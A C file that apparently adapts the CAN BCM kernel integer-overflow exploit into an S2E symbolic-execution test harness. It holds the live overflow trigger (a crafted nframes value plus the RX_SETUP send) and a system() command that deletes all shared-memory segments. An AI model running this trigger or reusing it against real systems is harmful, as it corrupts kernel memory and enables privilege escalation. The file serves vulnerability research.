#include "s2e.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define SLUB "kmalloc-96"
#define ALLOCATION 96
#define FILLER 100

#ifndef PF_CAN
#define PF_CAN 29
#endif

#ifndef CAN_BCM
#define CAN_BCM 2
#endif

struct sockaddr_can {
	sa_family_t can_family;
	int can_ifindex;
	union {
		struct { uint32_t rx_id, tx_id; } tp;
	} can_addr;
};

struct can_frame {
	uint32_t can_id;
	uint8_t can_dlc;
	uint8_t data[8] __attribute__((aligned(8)));
};

struct bcm_msg_head {
	uint32_t opcode;
	uint32_t flags;
	uint32_t count;
	struct timeval ival1, ival2;
	uint32_t can_id;
	uint32_t nframes;
	struct can_frame frames[0];
};

#define RX_SETUP 5
#define RX_DELETE 6
#define CFSIZ sizeof(struct can_frame)
#define MHSIZ sizeof(struct bcm_msg_head)
#define IPCMNI 32768
#define	EIDRM 43
#define HDRLEN_KMALLOC 8


int main(void)
{
	int *shmids;
	int i, ret, sock, cnt, base, smashed;
	int diff, active, total, active_new, total_new;
	int len, sock_len, mmap_len;
	struct sockaddr_can addr;
	struct bcm_msg_head *msg;
	void *efault;
	char *buf;

	printf("[+] creating PF_CAN socket...\n");

	sock = socket(PF_CAN, SOCK_DGRAM, CAN_BCM);
	if (sock < 0) {
		printf("[-] kernel lacks CAN packet family support\n");
		exit(1);
	}

	printf("[+] connecting PF_CAN socket...\n");

	memset(&addr, 0, sizeof(addr));
	addr.can_family = PF_CAN;

	ret = connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	if (sock < 0) {
		printf("[-] could not connect CAN socket\n");
		exit(1);
	}

	len = MHSIZ + (CFSIZ * (ALLOCATION / 16));
	msg = malloc(len);
	memset(msg, 0, len);
	msg->can_id = 2959;
	msg->nframes = (UINT_MAX / CFSIZ) + (ALLOCATION / 16) + 1;
	s2e_enable_forking();
s2e_make_symbolic(&(msg->nframes), 4, "nframes");
	printf("[+] clearing out any active OPs via RX_DELETE...\n");
	
	msg->opcode = RX_DELETE;
	ret = send(sock, msg, len, 0);

	printf("[+] removing any active user-owned shmids...\n");

	system("for shmid in `cat /proc/sysvipc/shm | awk '{print $2}'`; do ipcrm -m $shmid > /dev/null 2>&1; done;");

	printf("[+] massaging " SLUB " SLUB cache with dummy allocations\n");

	msg->opcode = RX_SETUP;
	ret = send(sock, msg, len, 0);	
s2e_disable_forking();
s2e_kill_state(0,"done!\n");
return 0;
}
